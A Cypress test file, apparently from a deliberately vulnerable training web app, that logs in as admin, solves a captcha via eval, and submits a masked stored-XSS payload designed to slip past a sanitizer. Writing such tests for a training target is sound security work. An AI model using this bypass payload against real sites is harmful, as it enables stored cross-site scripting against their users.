describe("/#/contact", () => {
  beforeEach(() => {
    cy.login({ email: "admin", password: "admin123" });

    cy.visit("/#/contact");
    cy.wait(500);
    // for recaptcha to load

    solveNextCaptcha();
  });

  describe('challenge "persistedXssFeedback"', () => {
    it("should be possible to trick the sanitization with a masked XSS attack", () => {
      cy.task("disableOnContainerEnv").then((disableOnContainerEnv) => {
        if (!disableOnContainerEnv) {
          cy.get("#comment").type(
            '<<script>Foo</script>iframe src="javascript:alert(`xss`)">'
          );

          cy.get("#rating").click();
          cy.get("#submitButton").click();

          cy.visit("/#/administration");
          console.log("61");

          // This is where the alert window shows up
          // cy.on("window:alert", (t) => {
          //   console.log("test");

          // });

          cy.get(".mat-cell.mat-column-remove > button").last().click();

          cy.expectChallengeSolved({ challenge: "Server-side XSS Protection" });
        }
      });
    });
  });

  function solveNextCaptcha() {
    cy.get("#captcha").then(($text) => {
      cy.get("#captchaControl").clear();
      cy.wait(3000).then(() => {
        const answer = eval($text.text()).toString(); // eslint-disable-line no-eval
        cy.get("#captchaControl").type(answer);
      });
    });
  }
});
